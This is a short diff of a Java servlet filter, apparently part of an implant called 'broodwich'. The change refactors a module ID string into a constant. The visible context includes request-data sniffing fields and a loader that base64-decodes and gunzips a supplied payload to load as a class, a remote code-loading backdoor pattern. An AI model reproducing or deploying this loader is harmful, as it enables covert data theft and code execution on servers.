@@ -31,6 +31,7 @@ public class BroodwichFilter implements Filter {
     static final String filterName = "broodwich";
     public static final String setPatternModule = "party.itistimeto.broodwich.modules.setpattern";
     public static final String flushMatchesModule = "party.itistimeto.broodwich.modules.flushmatches";
+    public static final String loaderModule = "party.itistimeto.broodwich.modules.load";
     private ConcurrentLinkedQueue<String> sniffedData;
     private ConcurrentHashMap<String, Class> modules;
     private Pattern sniffPattern;
@@ -111,7 +112,7 @@ public class BroodwichFilter implements Filter {
                     e.printStackTrace();
                 }
             }
-            else if(moduleId.equals("party.itistimeto.broodwich.modules.load") && moduleParams.length == 2) {
+            else if(moduleId.equals(loaderModule) && moduleParams.length == 2) {
                 try {
                     InputStream gis = new GZIPInputStream(new ByteArrayInputStream(decodeBase64(moduleParams[1])));
                     ByteArrayOutputStream bos = new ByteArrayOutputStream();
